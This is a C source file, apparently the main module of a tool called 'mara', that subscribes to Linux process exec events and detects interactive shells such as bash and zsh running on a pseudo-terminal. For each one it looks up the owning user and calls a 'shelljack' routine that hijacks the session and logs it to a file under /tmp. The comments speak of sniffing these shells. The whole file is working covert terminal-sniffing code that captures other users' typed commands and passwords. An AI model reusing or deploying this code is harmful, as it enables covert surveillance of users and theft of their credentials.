#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <pwd.h>



#include "mara.h"

#define POT "/tmp/"

#define NUM_BINS 7
char *bins[] = {
    "/bin/bash",
    "/bin/sh",
    "/bin/tcsh",
    "/bin/zsh",
    "/bin/csh",
    "/bin/ksh",
    0
};



void jack(pid_t pid, char *exe, char *pty, char *stdin, char *user){
    TRACE("handle pid=%i exe=%s stdin=%s pty=%s user=%s",pid,exe,stdin,pty,user);
    char path[4096]={0};
    struct timeval tv;
    gettimeofday(&tv, NULL);
    int ret;
    if ((ret = sprintf(path,"%s/%s_%i_%li",POT,user,pid,tv.tv_sec)) < 0 ){
        TRACE("[-] can't get log path : %s",strerror(errno));
        return;
    }

    shelljack(pid,path);

}

int handle(struct proc_event proc_ev){
    int ret = -1;
    char *sret = NULL;
    char exe[4096] = {0};
    char path[4096] = {0};
    char pty[4096] = {0};
    char map[4096] = {0};
    struct stat st;
    struct passwd *pw;

    // get real exe name
    if ((ret = sprintf(path,"/proc/%d/exe",proc_ev.event_data.id.process_pid)) < 0 ){
        TRACE("[-] can't get exe path : %s",strerror(errno));
        return -1;
    }
    if ((ret = readlink(path,exe,4096)) < 0){
        return -1;
    }

    // exe in interesting process list to sniff ?
    char *bin = NULL;

    for (int i = 0 ;i < NUM_BINS; i++){
        bin = bins[i];
        if(!bin)
            break;
        if ((sret = strstr(exe,bin)) != NULL)
            break;
    }

    if(bin){
        // ok good process let's check if it has a pty
        memset(path,0,4096);
        if ((ret = sprintf(path,"/proc/%d/fd/0",proc_ev.event_data.id.process_pid)) < 0 ){
            TRACE("[-] can't get exe stdin: %s ",strerror(errno));
            return -1;
        }

        if ((ret = readlink(path,pty,4096)) < 0){
            TRACE("[-] can't read stdin symlink : %s",strerror(errno));
            return -1;
        }

        // stdin in tty/pty and not socket/pipe ?
        if ((sret = strstr(pty,"/dev/pts")) == NULL)
            return -1;

        if ((ret = sprintf(map,"/proc/%d/maps",proc_ev.event_data.id.process_pid)) < 0 ){
            TRACE("[-] can't get map : %s",strerror(errno));
            return -1;
        }

        if ( (ret = stat(map,&st)) < 0) {
            TRACE("[-] can't stat %s: %s ",exe,strerror(errno));
            return -1;
        }

        if ( (pw = getpwuid(st.st_uid))  == NULL){
            TRACE("[-] can't get info on uid  %d: %s ",st.st_uid,strerror(errno));
            return -1;
        }
        // process ok controlling terminal ok let's sniff that shit
        jack(proc_ev.event_data.id.process_pid, exe, pty, path, pw->pw_name);

    }
    return 0;
}

void nl_listen(){
    struct sockaddr_nl sa;
    int sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
    if(sock > 0){
        sa.nl_family = AF_NETLINK;
        sa.nl_groups = CN_IDX_PROC;
        sa.nl_pid = getpid();
        int res = bind(sock, (struct sockaddr *)&sa, sizeof(sa));
        if (res < 0){
            close(sock);
            perror("[-] Unable to bind sock");
            exit(-1);
        }

        struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
        struct nlmsghdr nl_hdr;

        struct __attribute__ ((__packed__)) {
            struct cn_msg cn_msg;
            enum proc_cn_mcast_op cn_mcast;
        };
        } sock_msg;

        memset(&sock_msg, 0, sizeof(sock_msg));

        sock_msg.nl_hdr.nlmsg_len = sizeof(sock_msg);
        sock_msg.nl_hdr.nlmsg_pid = getpid();
        sock_msg.nl_hdr.nlmsg_type = NLMSG_DONE;
        sock_msg.cn_msg.id.idx = CN_IDX_PROC;
        sock_msg.cn_msg.id.val = CN_VAL_PROC;
        sock_msg.cn_msg.len = sizeof(enum proc_cn_mcast_op);
        sock_msg.cn_mcast = PROC_CN_MCAST_LISTEN;
        //nlcn_msg.cn_mcast = PROC_CN_MCAST_IGNORE;

        res = send(sock, &sock_msg, sizeof(sock_msg), 0);

        if (res < 0){
            close(sock);
            TRACE("[-] Unable to write to sock : %s ",strerror(errno));
            exit(-1);
        }

        struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
            struct nlmsghdr nl_hdr;
            struct __attribute__ ((__packed__)) {
            struct cn_msg cn_msg;
            struct proc_event proc_ev;
            };
        } nlcn_msg;

        memset(&nlcn_msg, 0, sizeof(nlcn_msg));

        while(1){
            res = recv(sock, &nlcn_msg, sizeof(nlcn_msg), 0);
            if (res == 0 || res == -1) continue;
            switch (nlcn_msg.proc_ev.what) {

            case PROC_EVENT_EXEC:
                handle(nlcn_msg.proc_ev);
                break;

            default:
                break;
            }
        }
    }
}

int main(){
    nl_listen();
    return 0;
}
